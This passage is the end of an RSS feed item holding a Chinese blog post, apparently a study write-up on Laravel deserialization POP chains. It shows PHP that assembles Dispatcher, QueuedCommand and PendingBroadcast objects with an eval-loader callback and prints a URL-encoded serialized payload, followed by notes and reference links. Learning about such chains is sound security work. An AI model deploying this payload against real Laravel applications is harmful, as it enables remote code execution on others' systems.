+&lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
+&lt;p>这个链子非常的长，涉及到6个类&lt;/p>
+&lt;hr>
+&lt;p>pop链杀我！！！看代码有种目害的感觉了&lt;/p>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POP链简析 &lt;/a>
+&lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.x反序列化POP链&lt;/a>&lt;/p>
+&lt;/details></description></item></channel></rss>
